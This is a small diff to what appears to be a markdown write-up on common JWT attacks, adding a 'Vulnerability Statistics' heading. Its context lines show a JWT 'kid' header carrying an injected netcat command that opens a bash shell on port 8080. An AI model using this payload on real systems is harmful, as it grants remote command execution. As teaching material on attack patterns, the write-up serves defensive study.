@@ -373,7 +373,8 @@ For example
 "kid": "anykey | nc -nlvkp 8080 -e /bin/bash"
 }
 ```
-
+<br />
+## Vulnerability Statistics
 These were the most common JWT attacks, and there are more misconfigurations you can find in the resource section. After reading the write-ups and disclosure of vulnerabilities on HackerOne, I found these statistics, though there is a lack of sources.
 <br />
 <br />
